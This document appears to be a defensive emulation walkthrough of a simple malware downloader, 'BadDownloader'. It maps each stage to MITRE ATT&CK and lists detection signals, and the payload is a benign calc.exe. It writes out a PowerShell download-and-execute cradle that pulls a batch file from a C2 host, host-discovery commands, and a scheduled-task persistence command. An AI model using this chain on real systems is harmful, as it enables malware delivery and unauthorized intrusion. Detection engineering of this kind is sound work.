# BadDownloader — Full Attack Chain Walkthrough

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This code replicates documented malware behavior for defensive security
testing and endpoint telemetry validation. It does NOT contain real malware
payloads, exploits, or evasion techniques.

LEGAL: Only run this in environments you own or have explicit written
authorization to test. Unauthorized use may violate computer fraud laws.

Final payload: calc.exe (safe, benign)
C2: Local network only (hardcoded private IP: 192.168.0.148)
============================================================================
```

## Attack Overview

BadDownloader is an intentionally simple, "script kiddie" style downloader. Unlike JawDropper (QakBot) and MuddyCalc (MuddyWater), there is no sophistication here — no evasion, no encoded commands, no DLL proxy execution. The simplicity is the point: even basic threats leave detectable traces in endpoint telemetry.

## Process Tree

```
BadDownloader.exe                                        ← Stage 1: Custom binary
  └── cmd.exe /c powershell.exe Invoke-WebRequest ...    ← T1059.001, T1105
        └── powershell.exe                               ← Downloads .bat from C2
  └── cmd.exe /c %TEMP%\baddownload.bat                  ← T1059.003
        ├── whoami                                       ← T1033
        ├── ipconfig /all                                ← T1016
        ├── systeminfo                                   ← T1082
        ├── net user                                     ← T1087.001
        ├── schtasks /create /tn "BadDownloader" ...     ← T1053.005
        └── calc.exe                                     ← SAFE PAYLOAD
```

## Stage 0: Delivery

**MITRE:** T1204.002 — User Execution: Malicious File

In a real scenario, the BadDownloader binary would arrive via a phishing email, malicious download link, or USB drop. For our lab, the operator manually copies `BadDownloader.exe` to the Windows VM and executes it.

```
MacBook (192.168.0.148)                    Windows VM
       │                                        │
       │  python3 -m http.server 8888           │
       │  (serving stage2-payload/ directory)   │
       │                                        │
       │  BadDownloader.exe copied to VM        │
       │ ──────────────────────────────────────►│
       │                                        │
```

## Stage 1: Download Cradle

**MITRE:** T1059.001 — PowerShell, T1105 — Ingress Tool Transfer

BadDownloader.exe uses `CreateProcessA` to spawn:
```
cmd.exe /c powershell.exe Invoke-WebRequest "http://192.168.0.148:8888/baddownload.bat" -OutFile "%TEMP%\baddownload.bat"
```

This creates the process tree:
```
BadDownloader.exe
  └── cmd.exe
        └── powershell.exe
```

**Detection signals:**
- Process creation: `BadDownloader.exe` → `cmd.exe` → `powershell.exe`
- Command line: Contains `Invoke-WebRequest` and IP address `192.168.0.148`
- Network: HTTP GET to `192.168.0.148:8888`
- File write: `baddownload.bat` created in `%TEMP%`

## Stage 2: Payload Execution

**MITRE:** T1059.003 — Windows Command Shell

After the download completes, BadDownloader.exe spawns a second `cmd.exe` to execute the .bat file:
```
cmd.exe /c %TEMP%\baddownload.bat
```

### 2a. Discovery Burst

The .bat file runs four discovery commands in sequence:

```
cmd.exe /c %TEMP%\baddownload.bat
  ├── whoami              ← T1033: Who am I?
  ├── ipconfig /all       ← T1016: Network configuration
  ├── systeminfo          ← T1082: OS version, hotfixes, domain
  └── net user            ← T1087.001: Local user accounts
```

**Detection signals:**
- Multiple discovery commands spawned by a single `cmd.exe` process
- `whoami` + `ipconfig` + `systeminfo` burst pattern
- All children share the same parent PID

### 2b. Persistence

**MITRE:** T1053.005 — Scheduled Task

```
schtasks /create /tn "BadDownloader" /tr "calc.exe" /sc daily /st 08:00 /f
```

**SAFETY:** The scheduled task runs `calc.exe`, not the downloader or any malicious payload.

**Detection signals:**
- Process creation: `schtasks.exe` with `/create` flag
- Scheduled task: Name "BadDownloader", action `calc.exe`
- Windows Event ID 4698: Task created

### 2c. Final Payload

```
calc.exe
```

**SAFE:** Calculator launches as proof of execution. In a real attack, this would be a RAT, miner, or ransomware.

## Full Attack Chain Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         BadDownloader Attack Chain                          │
│                  (Generic Script-Kiddie Downloader Emulation)               │
└─────────────────────────────────────────────────────────────────────────────┘

  [Operator]                  [Windows Target]                    [MacBook C2]
    │                             │                             192.168.0.148
    │                             │                                  │
    │  1. Execute                 │                                  │
    │     BadDownloader.exe       │                                  │
    │ ─────────────────────────►  │                                  │
    │                             │                                  │
    │                    ┌────────┴────────┐                         │
    │                    │ BadDownloader   │ T1204.002               │
    │                    │ .exe            │ User Execution          │
    │                    └────────┬────────┘                         │
    │                             │                                  │
    │                             │ CreateProcess: cmd.exe            │
    │                             ▼                                  │
    │                    ┌─────────────────┐                         │
    │                    │    cmd.exe      │ T1059.001               │
    │                    │ powershell.exe  │ PowerShell              │
    │                    │ Invoke-WebReq.. │                         │
    │                    └────────┬────────┘                         │
    │                             │                                  │
    │                             │ 2. Download .bat                 │
    │                             │ ────────────────────────────────►│
    │                             │   GET /baddownload.bat           │
    │                             │ ◄────────────────────────────────│
    │                             │        baddownload.bat           │
    │                             │                                  │
    │                             │ T1105 Ingress Tool Transfer      │
    │                             │                                  │
    │                             │ Execute .bat                     │
    │                             ▼                                  │
    │                    ┌─────────────────┐                         │
    │                    │    cmd.exe      │ T1059.003               │
    │                    │ baddownload.bat │ Command Shell            │
    │                    └────────┬────────┘                         │
    │                             │                                  │
    │                             │ Discovery burst                  │
    │                             ▼                                  │
    │                    ┌─────────────────┐                         │
    │                    │ • whoami        │ T1033, T1016            │
    │                    │ • ipconfig /all │ T1082, T1087.001        │
    │                    │ • systeminfo    │ Discovery Commands      │
    │                    │ • net user      │                         │
    │                    └────────┬────────┘                         │
    │                             │                                  │
    │                             │ Create persistence               │
    │                             ▼                                  │
    │                    ┌─────────────────┐                         │
    │                    │   schtasks      │ T1053.005               │
    │                    │   /create ...   │ Scheduled Task          │
    │                    └────────┬────────┘                         │
    │                             │                                  │
    │                             │ Launch "payload"                 │
    │                             ▼                                  │
    │                    ┌─────────────────┐                         │
    │                    │   calc.exe      │ SAFE PAYLOAD            │
    │                    │   (benign)      │ Emulation complete      │
    │                    └─────────────────┘                         │
    │                                                                │
```

## Comparison to Sophisticated Malware

| Aspect | BadDownloader | JawDropper (QakBot) | MuddyCalc (MuddyWater) |
|--------|---------------|---------------------|--------------------------|
| Initial execution | Direct .exe | JS dropper → PowerShell | Macro → VBScript |
| Download method | PowerShell Invoke-WebRequest | PowerShell encoded command | Macro writes script directly |
| Payload format | .bat file | DLL via regsvr32 | VBScript + PowerShell |
| Evasion | None | Sleep, signed binary proxy | Sleep, encoded command |
| Persistence | Scheduled task | Scheduled task | Registry Run key |
| Sophistication | Script kiddie | Nation-state TTP | APT (MOIS-sponsored) |
